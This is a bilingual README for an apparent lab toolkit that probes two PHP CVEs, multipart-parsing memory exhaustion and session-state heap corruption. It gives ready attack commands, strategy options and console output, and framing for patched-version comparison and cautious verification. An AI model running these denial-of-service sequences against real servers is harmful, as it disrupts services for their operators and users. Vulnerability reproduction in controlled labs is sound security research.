# PHP CVE-2026-109618 / CVE-2026-109619 — Lab Diagnostics

**[中文](#中文说明) | [English](#english)**
<img width="1453" height="862" alt="image" src="https://github.com/user-attachments/assets/f3cadc02-8a6f-42e2-948b-7e411a5923af" />

---

## English

> The OOM and Session lifecycle probes do not require ELF offsets. That does not make them portable RCE exploits.

HTTP diagnostic toolkit for PHP CVE-2026-109618 and CVE-2026-109619. Affected-version ranges describe the PHP bugs, not a guarantee that one request sequence will interrupt every unpatched deployment.

### Quick Start

```bash
python interactive.py
```

```
DoS> target 192.168.1.10:8088
DoS> 109618
```

In a matching lab, the console can observe request-parsing OOM and the Session A→B lifecycle path. It reads `memory_limit` and `post_max_size` only when the target's supplied `health.php` exposes them; otherwise its preset sizes are assumptions. A PHP OOM is not by itself evidence of either CVE or a worker crash.

- **`109618`** — multipart OOM candidate; verify the internal interrupted-initialization path separately
- **`session`** — CVE-2026-109619 Session A→B candidate; a transport error does not establish a worker crash

```
DoS> target 192.168.1.10:8088
Target set: http://192.168.1.10:8088

DoS> 109618
[CVE-2026-109618] OOM attack — part-headers
Step 1: Health check (baseline)...
  PID: 19104, HTTP 200
  post_max_size=8M, memory_limit=128M
  Auto-fit within 8 MiB: part-headers=599,168
Step 2: Sending 7.3 MiB multipart (part-headers)...
  Fatal error: Allowed memory size of 134217728 bytes exhausted
  OOM observed; CVE impact not determined

DoS> session
[CVE-2026-109619] Session lifecycle probe
Step 3: Producer (OOM with session progress)...
  A OOM response observed
Step 4: Consumer (session progress callback on stale state)...
  ConnectionResetError
  B transport error observed; worker crash not confirmed by HTTP alone
```

### Interactive Console

```bash
python interactive.py
# or with target:
python interactive.py http://target:8088
```

```
Commands:
  target <url>                Set target URL (e.g. http://192.168.1.10:8088)
  show                        Show current settings
  health                      Send health check to target
  109618 [strategy]           Run a CVE-2026-109618 OOM candidate
                              Strategies: part-headers, empty-files, form-value, files-registration
  109619                      Probe the PHP 8.5 fatal-backtrace path (requires an early consumer)
  session                     Probe the CVE-2026-109619 Session lifecycle path
  set <key> <value>           Set parameter (see 'set' for list)
  help                        Show this help
  exit / quit                 Exit
```

### Candidate Paths

#### CVE-2026-109618: Multipart Parsing OOM

Multipart request bodies can trigger OOM during PHP request parsing. The same memory limit can reject a request on a patched build; worker termination and CVE-specific memory corruption require separate evidence.

Available OOM candidate strategies include:
- **part-headers** — a single multipart part with massive custom headers (auto-scaled to fit `post_max_size`)
- **empty-files** — many empty file fields (capped by PHP `max_multipart_body_parts`)
- **form-value** — large form value (requires `post_max_size >= memory_limit`)

```bash
# Dry run (generates JSON only, no requests sent)
python attacker.py 109618 --target http://192.168.56.10:8088

# Execute (part-headers strategy)
python attacker.py 109618 --target http://192.168.56.10:8088 --health oom/health.php --upload oom/upload.php --part-headers 150000 --execute --report report-109618.json

# Execute (empty-files strategy)
python attacker.py 109618 --target http://192.168.56.10:8088 --oom-strategy empty-files --empty-files 500 --execute --report report-109618-empty.json

# Execute (form-value strategy, target needs memory_limit=8M)
python attacker.py 109618 --target http://192.168.56.10:8088 --upload oom/upload.php --oom-strategy form-value --field-bytes 6291456 --execute --report report-109618-form.json
```

#### CVE-2026-109619: Cross-Request Heap Corruption via Session

A two-step A→B candidate: Request A may leave Session state after an interrupted upload-progress operation; Request B must reach the same worker and consume it. The producer state, consumer access, and any process crash must be checked rather than inferred from a timeout.

The separate `109619` command targets PHP 8.5 fatal-error backtrace state. It needs `fatal_error_backtraces` enabled and an explicitly configured early consumer that reports `auto_detect_line_endings=1`; an ordinary `health.php` request is not that consumer. This tool checks that particular configuration, not every possible early diagnostic.

```bash
# Dry run
python attacker.py 109619 --target http://192.168.56.10:8088

# Execute (fatal-backtrace → early INI consumer)
python attacker.py 109619 --target http://192.168.56.10:8088 --consumer early/health.php --execute --report report-109619.json
```

**Session lifecycle probe** (finer-grained 109619 reproduction):

```bash
# A→B sequence with session upload-progress
python session_progress_probe.py --target http://target:8088 --health session/health.php --seed session/session-seed.php --producer session/upload.php --consumer session/upload.php --execute --report session-old.json

# Comparison against patched version
python session_progress_probe.py --target http://target:8089 --expected-php 8.5.12 --health session/health.php --seed session/session-seed.php --producer session/upload.php --consumer session/upload.php --execute --report session-patched.json
```

**Availability probe** (samples health during the sequence; timeouts alone do not prove a crash or exact outage duration):

```bash
python availability_probe.py --target http://target:8088 --expected-php 8.5.11 --report availability-old.json --execute
python availability_probe.py --target http://target:8089 --expected-php 8.5.12 --report availability-patched.json --execute
```

### File Layout

```
DoS-Attack/
├── interactive.py               # Interactive DoS console (REPL)
├── attacker.py                  # Main attack tool (109618 OOM + 109619 cross-request)
├── availability_probe.py        # Availability measurement (109619 A→B + continuous health sampling)
├── session_progress_probe.py    # Session upload-progress lifecycle diagnostic
├── probe.py                     # Simple probe
├── README.md                    # This file
└── public/                      # Target-side PHP files (place in Apache DocumentRoot)
    ├── health.php               # Health check (returns PHP version/SAPI/PID)
    ├── upload.php               # General multipart upload endpoint
    ├── fatal.php                # Fatal error producer (exception)
    ├── fatal-backtrace.php      # Fatal error producer (E_USER_ERROR)
    ├── .htaccess.example        # Early INI consumer config example
    └── session/
        ├── health.php           # Session area health check
        ├── upload.php           # Session area upload endpoint
        ├── session-seed.php     # Session ID acquisition endpoint
        └── .htaccess.example    # Session area config (memory_limit + strict_mode)
```

### Target Preparation

1. Install unpatched PHP 8.5.11 + Apache `mod_php` (prefork, single worker)
2. Set `public/` as DocumentRoot
3. Verify `GET /health.php` returns the `official-cve-lab-v1` marker
4. For the 109618 OOM path: set `memory_limit 8M` in the `oom/` subdirectory
5. For the PHP 8.5 backtrace path: enable `fatal_error_backtraces` and supply a separate `early/` health endpoint that reports `auto_detect_line_endings=1`. The example `early/health.php` is not bundled; without it, the probe stops at preflight.
6. Prepare a PHP 8.5.12 comparison environment

### References

- [CVE-2026-109618 Advisory](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [CVE-2026-109619 Advisory](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [PHP Security Fix Commit](https://github.com/php/php-src/commit/31c0ea7d7ff1d1fccb6492e52dab544011628065)

### Verdict Criteria

HTTP 500, connection reset, worker PID change, or OOM **alone are insufficient to prove a CVE or worker crash**. Confirm process exit with server-side logs or a dump, and confirm the CVE path with debugger/ASAN evidence and a patched-version comparison. The CLI JSON verdict remains `not_determined`; interactive output describes observations rather than declaring a confirmed exploit.

---

## 中文说明

> OOM 与 Session 生命周期探针不需要 ELF 偏移；这不代表它们是跨构建通用的 RCE 利用。

PHP CVE-2026-109618 和 CVE-2026-109619 的 HTTP 实验诊断工具。受影响版本范围不等于同一组请求能让每个未修复部署稳定中断服务。

### 快速开始

```bash
python interactive.py
```

```
DoS> target 192.168.1.10:8088
DoS> 109618
```

在匹配的靶场中，控制台可观察请求解析期 OOM 与 Session A→B 生命周期路径。只有目标提供相应 `health.php` JSON 字段时，程序才能读取 `memory_limit` 和 `post_max_size`；否则使用预设值。OOM 本身不证明 CVE 或 worker 崩溃。

- **`109618`** — multipart OOM 候选；是否进入未完成初始化窗口仍需单独验证
- **`session`** — CVE-2026-109619 Session A→B 候选；传输错误不能单独证明 worker 崩溃

```
DoS> target 192.168.1.10:8088
Target set: http://192.168.1.10:8088

DoS> 109618
[CVE-2026-109618] OOM attack — part-headers
Step 1: Health check (baseline)...
  PID: 19104, HTTP 200
  post_max_size=8M, memory_limit=128M
  Auto-fit within 8 MiB: part-headers=599,168
Step 2: Sending 7.3 MiB multipart (part-headers)...
  Fatal error: Allowed memory size of 134217728 bytes exhausted
  已观察到 OOM；CVE 影响尚未判定

DoS> session
[CVE-2026-109619] Session lifecycle probe
Step 3: Producer (OOM with session progress)...
  已观察到 A 的 OOM 响应
Step 4: Consumer (session progress callback on stale state)...
  ConnectionResetError
  已观察到 B 传输错误；仅凭 HTTP 不能确认 worker 崩溃
```

### 交互控制台

```bash
python interactive.py
# 或直接指定目标：
python interactive.py http://target:8088
```

```
Commands:
  target <url>                设置目标 URL（如 http://192.168.1.10:8088）
  show                        显示当前设置
  health                      发送健康检查
  109618 [strategy]           检查 CVE-2026-109618 OOM 候选
                              策略: part-headers, empty-files, form-value, files-registration
  109619                      检查 PHP 8.5 fatal-backtrace 路径（需要早期消费者）
  session                     检查 CVE-2026-109619 Session 生命周期路径
  set <key> <value>           设置参数（输入 set 查看列表）
  help                        显示帮助
  exit / quit                 退出
```

### 候选路径

#### CVE-2026-109618：Multipart 解析 OOM

Multipart 请求可在 PHP 解析阶段触发 OOM。修复版也可能按内存限额拒绝请求；worker 退出和 CVE 特有的内存损坏需要另外取证。

可用的 OOM 候选策略包括：
- **part-headers** — 单个 multipart part 附加大量自定义头（自动缩放至 `post_max_size` 内）
- **empty-files** — 大量空文件字段（受 PHP `max_multipart_body_parts` 限制）
- **form-value** — 超大表单值（需 `post_max_size >= memory_limit`）

```bash
# Dry run（只生成 JSON，不发请求）
python attacker.py 109618 --target http://192.168.56.10:8088

# 执行攻击（part-headers 策略）
python attacker.py 109618 --target http://192.168.56.10:8088 --health oom/health.php --upload oom/upload.php --part-headers 150000 --execute --report report-109618.json

# 执行攻击（empty-files 策略）
python attacker.py 109618 --target http://192.168.56.10:8088 --oom-strategy empty-files --empty-files 500 --execute --report report-109618-empty.json

# 执行攻击（form-value 策略，需目标 memory_limit=8M）
python attacker.py 109618 --target http://192.168.56.10:8088 --upload oom/upload.php --oom-strategy form-value --field-bytes 6291456 --execute --report report-109618-form.json
```

#### CVE-2026-109619：Session 跨请求堆破坏

两步 A→B 候选序列：请求 A 在上传进度处理期间被中断后可能留下 Session 状态；请求 B 必须由同一 worker 消费该状态。应分别核实生产者状态、消费者读取和实际进程异常，而不能由超时推断崩溃。

另一个 `109619` 命令针对 PHP 8.5 的致命错误回溯状态，需要启用 `fatal_error_backtraces`，并显式配置会回显 `auto_detect_line_endings=1` 的早期 consumer；普通 `health.php` 请求不具备这个条件。当前工具只检查这一种配置，不覆盖所有可能的早期诊断。

```bash
# Dry run
python attacker.py 109619 --target http://192.168.56.10:8088

# 执行攻击（fatal-backtrace → early INI consumer）
python attacker.py 109619 --target http://192.168.56.10:8088 --consumer early/health.php --execute --report report-109619.json
```

**Session 生命周期探针**（更精细的 109619 复现）：

```bash
# 带 session upload-progress 的 A→B 序列
python session_progress_probe.py --target http://target:8088 --health session/health.php --seed session/session-seed.php --producer session/upload.php --consumer session/upload.php --execute --report session-old.json

# 对照修补版
python session_progress_probe.py --target http://target:8089 --expected-php 8.5.12 --health session/health.php --seed session/session-seed.php --producer session/upload.php --consumer session/upload.php --execute --report session-patched.json
```

**可用性探针**（对请求期间的健康状态采样；超时本身不证明崩溃或精确停机时长）：

```bash
python availability_probe.py --target http://target:8088 --expected-php 8.5.11 --report availability-old.json --execute
python availability_probe.py --target http://target:8089 --expected-php 8.5.12 --report availability-patched.json --execute
```

### 文件说明

```
DoS-Attack/
├── interactive.py               # 交互式 DoS 控制台（REPL）
├── attacker.py                  # 主攻击工具（109618 OOM + 109619 跨请求）
├── availability_probe.py        # 可用性度量（109619 A→B + 持续健康采样）
├── session_progress_probe.py    # Session upload-progress 生命周期诊断
├── probe.py                     # 简易探针
├── README.md                    # 本文件
└── public/                      # 靶机端 PHP 文件（放入 Apache DocumentRoot）
    ├── health.php               # 健康检查（返回 PHP 版本/SAPI/PID）
    ├── upload.php               # 通用 multipart 上传端点
    ├── fatal.php                # Fatal error producer（异常）
    ├── fatal-backtrace.php      # Fatal error producer（E_USER_ERROR）
    ├── .htaccess.example        # 早期 INI consumer 配置示例
    └── session/
        ├── health.php           # Session 区域健康检查
        ├── upload.php           # Session 区域上传端点
        ├── session-seed.php     # Session ID 获取端点
        └── .htaccess.example    # Session 区域配置（memory_limit + strict_mode）
```

### 靶机准备

1. 安装未修补的 PHP 8.5.11 + Apache `mod_php`（prefork，单 worker）
2. 将 `public/` 设为 DocumentRoot
3. 确认 `GET /health.php` 返回 `official-cve-lab-v1` 标记
4. 109618 OOM 路径：在 `oom/` 子目录设置 `memory_limit 8M`
5. PHP 8.5 backtrace 路径：启用 `fatal_error_backtraces`，并提供会回显 `auto_detect_line_endings=1` 的独立 `early/` 健康端点。示例 `early/health.php` 未随仓库提供；缺少它时探针会在预检阶段停止。
6. 准备 PHP 8.5.12 对照环境

### 参考资料

- [CVE-2026-109618 公告](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [CVE-2026-109619 公告](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [PHP 安全修复提交](https://github.com/php/php-src/commit/31c0ea7d7ff1d1fccb6492e52dab544011628065)

### 判定边界

HTTP 500、连接重置、worker PID 变化或 OOM **都不足以单独证明 CVE 或 worker 崩溃**。进程退出应由服务端日志或转储确认，CVE 内部路径还需调试器/ASAN 与修复版对照。CLI JSON 的 verdict 保持 `not_determined`；交互输出只描述观察现象。
